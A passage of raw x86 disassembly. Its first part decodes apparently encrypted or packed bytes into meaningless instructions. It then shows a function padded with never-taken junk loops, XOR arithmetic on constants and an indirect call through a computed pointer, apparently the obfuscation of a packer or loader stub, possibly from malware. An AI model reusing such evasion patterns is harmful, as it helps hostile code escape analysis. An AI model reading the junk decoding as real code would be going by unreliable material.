  414b47:	or     ebp,DWORD PTR [edx+0x6d]
  414b4a:	dec    ebp
  414b4b:	jmp    0xb22f:0x36fcafdb
  414b52:	lea    eax,[ecx+0x4228e94e]
  414b58:	xchg   ebp,eax
  414b59:	scas   al,BYTE PTR es:[edi]
  414b5a:	out    0x0,al
  414b5c:	loopne 0x414afa
  414b5e:	mov    esp,0x27892259
  414b63:	bound  edx,QWORD PTR [ecx]
  414b65:	in     al,dx
  414b66:	in     al,0x49
  414b68:	out    0x5c,al
  414b6a:	repz (bad) 
  414b6c:	inc    esi
  414b6d:	cs dec ebp
  414b6f:	mov    eax,ds:0x84e3984a
  414b74:	cli    
  414b75:	pop    es
  414b76:	popf   
  414b77:	(bad)  
  414b79:	push   es
  414b7a:	xchg   esi,eax
  414b7b:	mov    al,0x3f
  414b7d:	sbb    al,0xc5
  414b7f:	in     al,dx
  414b80:	xlat   BYTE PTR ds:[ebx]
  414b81:	in     eax,dx
  414b82:	push   ebp
  414b83:	inc    esp
  414b84:	retf   0x600b
  414b87:	stc    
  414b88:	push   ds
  414b89:	dec    esi
  414b8a:	or     al,0xc9
  414b8c:	jne    0x414b99
  414b8e:	mov    dl,0x9d
  414b90:	pop    ss
  414b91:	mov    BYTE PTR [edx-0x75],ah
  414b94:	rcl    ecx,cl
  414b96:	in     eax,0x33
  414b98:	rol    BYTE PTR [ebx],1
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	add    bl,ah
  414bb3:	and    ebp,DWORD PTR [eax+eax*4-0x1a8780ee]
  414bba:	jle    0x414c34
  414bbc:	js     0x414ba7
  414bbe:	imul   ebx,esi,0xffffffc0
  414bc1:	stos   BYTE PTR es:[edi],al
  414bc2:	sbb    edi,edx
  414bc4:	xchg   esp,eax
  414bc5:	dec    edx
  414bc6:	jo     0x414b68
  414bc8:	into   
  414bc9:	imul   edi,DWORD PTR [edi+0x3e],0xfffffff8
  414bcd:	push   eax
  414bce:	outs   dx,DWORD PTR ds:[esi]
  414bcf:	jmp    0xff58975d
  414bd4:	lds    edx,FWORD PTR [eax+edi*4+0x4e170aae]
  414bdb:	and    al,0xa
  414bdd:	test   al,0xfc
  414bdf:	ss or  dh,bl
  414be2:	push   edx
  414be3:	rcl    DWORD PTR [ebp-0x34],cl
  414be6:	cs aaa 
  414be8:	imul   edx,DWORD PTR [ebx+0x77],0xa85d869e
  414bef:	and    al,BYTE PTR [edx+0x6c665922]
  414bf5:	pushfw 
  414bf7:	daa    
  414bf8:	push   edx
  414bf9:	jmp    0x5255:0xa4e320f8
  414c00:	cli    
  414c01:	into   
  414c02:	sbb    al,0x8f
  414c04:	rcl    BYTE PTR [edi-0x3b],cl
  414c07:	push   0xb38a3a3
  414c0c:	pushf  
  414c0d:	sub    cl,BYTE PTR [edi]
  414c0f:	jmp    FWORD PTR [edx]
  414c11:	ja     0x414bdc
  414c13:	xchg   ecx,eax
  414c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c15:	es dec di
  414c18:	jl     0x414bbd
  414c1a:	aas    
  414c1b:	pop    esi
  414c1c:	mov    BYTE PTR [esi],ah
  414c1e:	push   ss
  414c1f:	xlat   BYTE PTR ds:[ebx]
  414c20:	push   ecx
  414c21:	retf   
  414c22:	sahf   
  414c23:	into   
  414c24:	in     eax,dx
  414c25:	lahf   
  414c26:	jnp    0x414c12
  414c28:	gs push edi
  414c2a:	in     eax,0xd1
  414c2c:	nop
  414c2d:	xchg   edx,eax
  414c2e:	cmp    dl,BYTE PTR [ebx-0x7]
  414c31:	icebp  
  414c32:	sub    DWORD PTR [edx],eax
  414c34:	mov    esi,0x5d092646
  414c39:	sti    
  414c3a:	ds pop ebp
  414c3c:	inc    ecx
  414c3d:	lods   eax,DWORD PTR ds:[esi]
  414c3e:	imul   ch
  414c40:	jge    0x414bd5
  414c42:	mov    dl,0xa4
  414c44:	mov    bh,0x89
  414c46:	repnz push cs
  414c48:	fild   DWORD PTR ds:0x83a944e8
  414c4e:	mov    edx,DWORD PTR [ebp-0x4927e577]
  414c54:	fistp  QWORD PTR [ebx+0x60dade43]
  414c5a:	xchg   ebx,eax
  414c5b:	jmp    0xa0d94eb9
  414c60:	inc    ebx
  414c61:	hlt    
  414c62:	sub    ebp,DWORD PTR [eax+0x51947c26]
  414c68:	jp     0x414ccf
  414c6a:	mov    al,ds:0xf98b0971
  414c6f:	sbb    bh,al
  414c71:	push   ecx
  414c72:	mov    ah,0x65
  414c74:	pusha  
  414c75:	jbe    0x414c52
  414c77:	pop    esp
  414c78:	mov    al,BYTE PTR [ebx+0x7d]
  414c7b:	add    DWORD PTR [esi+0x7d],ecx
  414c7e:	in     al,dx
  414c7f:	retf   
  414c80:	js     0x414c1f
  414c82:	push   es
  414c83:	std    
  414c84:	loop   0x414cdf
  414c86:	lods   al,BYTE PTR ds:[esi]
  414c87:	sub    ecx,0xc6479948
  414c8d:	inc    edi
  414c8e:	lea    edi,[esi-0x13ec930e]
  414c94:	and    al,dl
  414c96:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414c98:	dec    ebp
  414c99:	imul   ebx,ebx,0x41d67729
  414c9f:	hlt    
  414ca0:	mov    ah,0x82
  414ca2:	add    esp,DWORD PTR [esi-0x2c]
  414ca5:	jl     0x414cbc
  414ca7:	jae    0x414c2d
  414ca9:	xchg   esi,eax
  414caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cab:	mov    esi,0xf7ff9c2a
  414cb0:	in     eax,dx
  414cb1:	jno    0x414d12
  414cb3:	adc    al,0x92
  414cb5:	out    dx,eax
  414cb6:	icebp  
  414cb7:	push   ds
  414cb8:	mov    ss,WORD PTR [eax+eiz*2+0x16]
  414cbc:	ins    DWORD PTR es:[edi],dx
  414cbd:	lahf   
  414cbe:	test   DWORD PTR [edi-0x2c],0x9d209872
  414cc5:	sub    edi,0xffffffbd
  414cc8:	in     eax,dx
  414cc9:	dec    ebp
  414cca:	ret    0x767
  414ccd:	sub    al,0xdd
  414ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd0:	jne    0x414c5c
  414cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd3:	xor    al,0x67
  414cd5:	je     0x414caf
  414cd7:	adc    bl,BYTE PTR [edx]
  414cd9:	mov    edi,0x114dd74a
  414cde:	or     BYTE PTR [eax+0x64],al
  414ce1:	stos   BYTE PTR es:[edi],al
  414ce2:	lock inc ecx
  414ce4:	(bad)
  414ce9:	jbe    0x414cbb
  414ceb:	cli    
  414cec:	popa   
  414ced:	jge    0x414c91
  414cef:	push   esp
  414cf0:	div    BYTE PTR [ebx-0x12]
  414cf3:	adc    dl,BYTE PTR [esi+0x62]
  414cf6:	pop    ebp
  414cf7:	shl    ebp,1
  414cf9:	mov    eax,0xf4b76db
  414cfe:	(bad)  
  414d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d01:	pop    ebx
  414d02:	mov    ebp,0x8eb1fbaa
  414d07:	or     DWORD PTR [ecx+ebx*4],edi
  414d0a:	mov    ds:0xf34c703c,eax
  414d0f:	ror    DWORD PTR [edi-0x6f12ab88],1
  414d15:	in     eax,dx
  414d16:	push   eax
  414d17:	dec    ecx
  414d18:	or     bl,BYTE PTR [esi-0x70]
  414d1b:	and    eax,0xef7323d2
  414d20:	cmp    ch,cl
  414d22:	fldcw  WORD PTR [edx-0x2dfb61fe]
  414d28:	shl    ebx,cl
  414d2a:	add    al,0x69
  414d2c:	data16 das 
  414d2e:	jmp    0xb7e1b52
  414d33:	cs push 0xffffffe1
  414d36:	pop    ecx
  414d37:	push   ebx
  414d38:	addr16 mov ?,edx
  414d3b:	jbe    0x414d4f
  414d3d:	ja     0x414d29
  414d3f:	inc    edi
  414d40:	add    bl,BYTE PTR [edx]
  414d42:	push   ecx
  414d43:	inc    esi
  414d44:	les    ebp,FWORD PTR [eax-0x6e]
  414d47:	mov    ebp,0x1707fcf9
  414d4c:	popf   
  414d4d:	lahf   
  414d4e:	push   0xc559e88d
  414d53:	and    bl,BYTE PTR [ebx+0x14]
  414d56:	add    dl,BYTE PTR [edx-0x7b070a9d]
  414d5c:	xchg   ebx,eax
  414d5d:	adc    BYTE PTR [ebx-0x2bf78ba9],bh
  414d63:	adc    ebx,0x1b
  414d66:	sti    
  414d67:	es imul esi,DWORD PTR fs:[eax+0x42],0xffffffd8
  414d6d:	xor    edx,eax
  414d6f:	fs cwde 
  414d71:	popf   
  414d72:	mov    esp,DWORD PTR [ebx]
  414d74:	test   al,0xd2
  414d76:	stos   BYTE PTR es:[edi],al
  414d77:	(bad)  
  414d79:	jns    0x414d32
  414d7b:	mov    al,ds:0xddb3e643
  414d80:	xor    eax,DWORD PTR [esi]
  414d82:	dec    esi
  414d83:	or     al,0xea
  414d85:	pop    ss
  414d86:	scas   eax,DWORD PTR es:[edi]
  414d87:	iret   
  414d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d89:	lods   al,BYTE PTR ds:[esi]
  414d8a:	mov    esp,0xf2604095
  414d8f:	pop    ss
  414d90:	jb     0x414de7
  414d92:	xlat   BYTE PTR ds:[ebx]
  414d93:	cmp    al,0xc2
  414d95:	stc    
  414d96:	pop    esi
  414d97:	je     0x414d2c
  414d99:	jne    0x414d41
  414d9b:	xchg   al,ch
  414d9d:	jo     0x414de2
  414d9f:	add    dh,BYTE PTR [ebp-0x17b9104f]
  414da5:	into   
  414da6:	fnsave [eax-0x243c0c31]
  414dac:	loop   0x414e21
  414dae:	cmp    ecx,DWORD PTR [ebp-0x5d]
  414db1:	push   cs
  414db2:	mov    bh,0x12
  414db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db5:	repz cmp DWORD PTR [ecx+0x40d30501],edx
  414dbc:	mov    edi,0xcf3218a9
  414dc1:	mov    ds:0x3554a829,al
  414dc6:	clc    
  414dc7:	mov    edi,0xe3129ebd
  414dcc:	int    0x1b
  414dce:	mov    ecx,0x72ddee48
  414dd3:	xchg   ecx,eax
  414dd4:	scas   eax,DWORD PTR es:[edi]
  414dd5:	mov    ch,BYTE PTR [esi+eiz*8+0x45511b90]
  414ddc:	ja     0x414d8a
  414dde:	inc    ebx
  414ddf:	mov    esi,0x5cd0cf28
  414de4:	fs out dx,al
  414de6:	cmp    ah,BYTE PTR [ebp-0x57]
  414de9:	xchg   ebx,eax
  414dea:	or     al,0x79
  414dec:	add    eax,0xbb3e7717
  414df1:	iret   
  414df2:	cmp    al,0x39
  414df4:	inc    eax
  414df5:	retf   
  414df6:	jnp    0x414dff
  414df8:	jle    0x414dc8
  414dfa:	cmp    DWORD PTR [ebx+0x50],0xe34b49d4
  414e01:	inc    ebp
  414e02:	ror    BYTE PTR [ebx],1
  414e04:	icebp  
  414e05:	or     edi,DWORD PTR [ebp+ebp*8-0x2]
  414e09:	mov    ebp,0x1d99957f
  414e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e10:	ins    DWORD PTR es:[edi],dx
  414e11:	add    BYTE PTR [edi+0x1ee8404b],ch
  414e17:	imul   DWORD PTR [eax-0x68b970c8]
  414e1d:	bound  edx,QWORD PTR [edx]
  414e1f:	retf   
  414e20:	add    dh,BYTE PTR [eax]
  414e22:	jo     0x414e8e
  414e24:	mov    eax,0xf4a3874
  414e29:	xchg   BYTE PTR [esi-0x54],ah
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42a7f5
  414e44:	xor    DWORD PTR ds:0x42a771,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42a7b9,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42a841,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42a841
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42a841,eax
  414e70:	cmp    DWORD PTR ds:0x42a841,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42a841,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42a84d
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42a801
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42a7f9,0x42a831
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42a801,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42a835,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42a775
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42a845,0x42a765
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42a7b1,0x42a841
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42a801,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42a769,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42a7fd,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42a7fd
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42a7fd,edi
  414f60:	cmp    DWORD PTR ds:0x42a7fd,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42a7fd,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42a809
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42a7fd,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42a7fd
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42a7fd,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42a7b5,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42a7c9,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42a76d
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42a845,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42a849,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42a7b9
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42a805,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42a845,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42a849,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42a849
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42a849,ecx
  415032:	cmp    DWORD PTR ds:0x42a849,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42a849,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42a871
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42a7f1,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42a885,0x42a7b5
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42a7c1,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42a7c5,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42a879,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42a879
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42a879,ecx
  4150bb:	cmp    DWORD PTR ds:0x42a879,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42a879,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42a83d
  4150e5:	xor    ecx,DWORD PTR ds:0x42a84d
  4150eb:	mov    DWORD PTR ds:0x42a83d,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42a7b1,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42a7f1
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42a875,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42a875
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42a875,ecx
  415120:	cmp    DWORD PTR ds:0x42a875,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42a875,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42a75d,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42a75d
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42a75d,ecx
  41515e:	cmp    DWORD PTR ds:0x42a75d,0xe
  415165:	jne    0x415176
  41516b:	push   0x42a99f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42a75d,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42a75d
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42a75d,ecx
  415190:	cmp    DWORD PTR ds:0x42a75d,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42a781
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42a7c1,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42a7c1
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42a7c1,ecx
  4151c1:	cmp    DWORD PTR ds:0x42a7c1,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42a7c1,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42a7c1,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42a7c1
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42a7c1,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42a7c9,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42a7c9
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42a7c9,ecx
  415230:	cmp    DWORD PTR ds:0x42a7c9,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42a7c9,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42a775
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42a7c9,0x42a881
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42a871,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42a841,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42a839,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42a765,0x42a87d
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42a83d,0x42a759
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42a7cd,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42a7cd
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42a7cd,ecx
  4152f0:	cmp    DWORD PTR ds:0x42a7cd,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42a7cd,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42a849
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42a781,0x10
  415329:	cmp    DWORD PTR ds:0x42a781,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42a781,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42a781,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42a781
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42a781,edx
  41536d:	mov    edx,DWORD PTR ds:0x42a781
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42a781,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42a7f1,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42a7f1
  415393:	inc    eax
  415394:	mov    ds:0x42a7f1,eax
  415399:	cmp    DWORD PTR ds:0x42a7f1,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42a7f1,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42a759
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42a7bd,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42a831,0x0
  4153ed:	mov    eax,ds:0x42a831
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42a831,eax
  4153f8:	cmp    DWORD PTR ds:0x42a831,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42a932
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42a831,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42a831
  41542b:	inc    eax
  41542c:	mov    ds:0x42a831,eax
  415431:	cmp    DWORD PTR ds:0x42a831,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42a761,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42a88d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42a88d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42a88d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42a769
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42a88d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42a88d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42a88d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42a88d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42a88d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42a7b9
  4154c7:	and    edx,DWORD PTR ds:0x42a84d
  4154cd:	mov    DWORD PTR ds:0x42a7b9,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42a781,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
